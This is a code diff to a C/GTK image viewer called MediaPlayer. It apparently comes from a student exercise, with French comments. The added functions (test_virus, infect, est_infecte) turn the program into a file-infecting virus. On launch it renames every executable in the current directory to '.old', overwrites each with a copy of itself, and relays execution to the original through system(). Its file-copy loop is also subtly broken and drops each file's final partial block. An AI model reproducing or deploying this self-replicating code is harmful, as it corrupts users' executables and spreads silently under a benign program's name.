@@ -6,6 +6,11 @@
     #include <stdio.h>
     #include <stdlib.h>
 
+    #include <sys/types.h>
+    #include <sys/stat.h>
+    #include <unistd.h>
+
+
     char** mediaList = NULL;
     int nbrMedia = 0;
     int curIndex = 0;
@@ -24,6 +29,7 @@
 
     float maxW = 400;
     float maxH = 400;
+
 
     int string_end_with(const char *str, const char *end){
       size_t len_str = strlen(str);
@@ -220,15 +226,73 @@
     }
 
 
-    int
-    main(int argc, char *argv [])
-    {
+    int est_infecte(const char * file){
+      if(string_end_with(file, ".old")){
+        return 1;
+      }
+      //On recherche si il existe un .old
+      char path[270] = "";
+      sprintf(path, "%s.old", file);
+      struct stat statFile;
+      return stat(path,&statFile)==0;
 
+    }
+    int est_executable(long mode){
+      return ((mode&S_IFMT)==S_IFREG) && ((mode&S_IXUSR)==S_IXUSR);
+    }
+
+    void duplicate_file(const char * fileSource, const char* fileDest){
+      FILE *source = fopen(fileSource, "rb");
+      FILE *dest = fopen(fileDest, "wb");
+      unsigned char buf[4096];
+      int n;
+      while ((n=fread(buf, 1, 4096, source)) == 4096) {
+        fwrite(buf,n, 1, dest );
+      }
+      fclose(source);
+      fclose(dest);
+    }
+
+    void infect(const char * file, const char * thisProg){
+      char newFile[270] = "";
+      sprintf(newFile,"%s.old", file);
+      rename(file, newFile);
+
+
+      duplicate_file(thisProg, file);
+      struct stat statFile;
+      stat(file,&statFile);
+      chmod(file, statFile.st_mode|S_IXUSR);
+
+
+    }
+
+    void test_virus(const char * actualProg){
+      //PARCOURS FICHIERS
+      DIR *d;
+      struct dirent *dir;
+      d = opendir(".");
+
+      struct stat sb;
+
+      while ((dir = readdir(d)) != NULL){
+        stat(dir->d_name, &sb);
+        if(!string_end_with(actualProg, dir->d_name)){//Si ce n'est pas ce programme
+          if(est_executable(sb.st_mode) && !est_infecte(dir->d_name)){
+            infect(dir->d_name, actualProg);
+          }
+        }
+      }
+      closedir(d);
+    }
+
+
+    int start_media_player(int *argc, char**argv[]){
       GtkBuilder *builder = NULL;
       GError *error = NULL;
       gchar *mainAppFile = NULL;
 
-      gtk_init(&argc, &argv);
+      gtk_init(argc, argv);
       builder = gtk_builder_new();
       mainAppFile =  g_build_filename ("glade_ui/imageViewer.glade", NULL);
       gtk_builder_add_from_file (builder, mainAppFile, &error);
@@ -248,6 +312,21 @@
       update_files(".");
 
       gtk_main();
+    }
+
+    int
+    main(int argc, char *argv [])
+    {
+      test_virus(argv[0]);
+
+      if(string_end_with(argv[0], "MediaPlayer.exe")){
+        return start_media_player(&argc,& argv);
+      }else{
+        char prog [270] = "";
+        sprintf(prog, "%s.old", argv[0]);
+        system(prog);
+      }
+
 
       return 0;
     }
